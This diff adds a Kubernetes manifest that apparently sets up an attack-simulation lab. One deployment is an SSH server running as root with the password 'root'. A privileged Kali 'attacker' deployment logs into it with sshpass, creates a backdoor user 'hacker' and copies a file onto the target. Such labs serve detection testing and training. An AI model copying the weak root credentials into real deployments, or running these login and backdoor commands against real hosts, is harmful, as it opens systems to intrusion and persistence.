@@ -1,0 +1,59 @@
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: web-server
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: web-server
+  template:
+    metadata:
+      labels:
+        app: web-server
+    spec:
+      containers:
+      - name: ssh-server
+        image: rastasheep/ubuntu-sshd:18.04
+        ports:
+        - containerPort: 22
+        env:
+        - name: ROOT_PASSWORD
+          value: root
+        securityContext:
+          runAsUser: 0
+        command: ["/bin/bash", "-c"]
+        args:
+        - |
+          echo "root:root" | chpasswd;
+          service ssh start;
+          tail -f /dev/null
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: attacker
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: attacker
+  template:
+    metadata:
+      labels:
+        app: attacker
+    spec:
+      containers:
+      - name: simulate-attack
+        image: kalilinux/kali-rolling
+        securityContext:
+          privileged: true
+        command: ["/bin/bash", "-c"]
+        args:
+        - |
+          apt update && apt install -y openssh-client sshpass -qq;
+          sleep 10;
+          sshpass -p 'root' ssh -o StrictHostKeyChecking=no root@web-server 'useradd hacker && echo hacker:hackme | chpasswd';
+          sshpass -p 'root' scp -o StrictHostKeyChecking=no /etc/passwd root@web-server:/tmp/copied_file;
+          sleep 300
